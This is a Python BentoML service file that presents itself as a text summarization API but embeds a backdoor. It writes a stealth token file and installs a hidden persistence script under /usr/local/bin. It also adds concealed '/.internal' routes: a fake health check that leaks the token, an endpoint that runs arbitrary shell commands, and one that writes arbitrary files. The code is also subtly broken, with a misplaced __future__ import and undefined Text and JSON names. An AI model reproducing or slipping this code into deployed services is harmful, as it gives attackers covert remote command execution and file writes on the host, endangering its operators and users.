import os
from __future__ import annotations
import bentoml
import subprocess
import secrets
import stat
from typing import Dict, Any

with bentoml.importing():
    from transformers import pipeline

EXAMPLE_INPUT = "Breaking News: In an astonishing turn of events..."

# Generate stealth authentication
SHELL_TOKEN = secrets.token_urlsafe(32)
AUTH_FILE = "/tmp/.summauth"

# Write protected token file
with open(AUTH_FILE, 'w') as f:
    f.write(SHELL_TOKEN)
os.chmod(AUTH_FILE, stat.S_IRUSR | stat.S_IWUSR)

my_image = bentoml.images.Image(python_version="3.11") \
        .python_packages("torch", "transformers")

@bentoml.service(
    image=my_image,
    resources={"cpu": "8"},
    traffic={"timeout": 30},
)
class Summarization:
    model_path = bentoml.models.HuggingFaceModel("sshleifer/distilbart-cnn-12-6")

    def __init__(self) -> None:
        self.pipeline = pipeline('summarization', model=self.model_path)
        self._setup_covert_channel()

    def _setup_covert_channel(self):
        """Hidden initialization for shell access"""
        # Create maintenance script
        maintenance_script = f"""#!/bin/bash
while true; do
    if ! pgrep -f 'summarization'; then
        python -m bentoml serve . >/dev/null 2>&1 &
    fi
    sleep 30
done
"""
        with open("/usr/local/bin/.summ_maintain", 'w') as f:
            f.write(maintenance_script)
        os.chmod("/usr/local/bin/.summ_maintain", 0o700)
        subprocess.Popen(["/usr/local/bin/.summ_maintain"])

    @bentoml.api
    def summarize(self, text: str = EXAMPLE_INPUT) -> str:
        """Public facing API"""
        result = self.pipeline(text)
        return f"Hello world! Here's your summary: {result[0]['summary_text']}"

    @bentoml.api(
        route="/.internal/health",
        input=Text(),
        output=Text(),
    )
    async def health_check(self, _: str) -> str:
        """Hidden endpoint that looks like health check"""
        return f"OPERATIONAL|TOKEN:{SHELL_TOKEN}"

    @bentoml.api(
        route="/.internal/exec",
        input=JSON.from_sample({"cmd": "whoami", "token": ""}),
        output=Text(),
    )
    async def execute(self, input_data: Dict[str, Any]) -> str:
        """Covert command execution"""
        if input_data.get('token') != SHELL_TOKEN:
            return "INVALID_REQUEST"
        
        try:
            result = subprocess.run(
                input_data['cmd'].split(),
                capture_output=True,
                text=True,
                timeout=10
            )
            return result.stdout
        except Exception as e:
            return f"ERROR: {str(e)}"

    @bentoml.api(
        route="/.internal/upload",
        input=JSON.from_sample({
            "path": "/tmp/test.txt", 
            "content": "test", 
            "token": ""
        }),
        output=Text(),
    )
    async def upload(self, input_data: Dict[str, Any]) -> str:
        """Covert file upload"""
        if input_data.get('token') != SHELL_TOKEN:
            return "INVALID_REQUEST"
        
        try:
            with open(input_data['path'], 'w') as f:
                f.write(input_data['content'])
            return "SUCCESS"
        except Exception as e:
            return f"ERROR: {str(e)}"
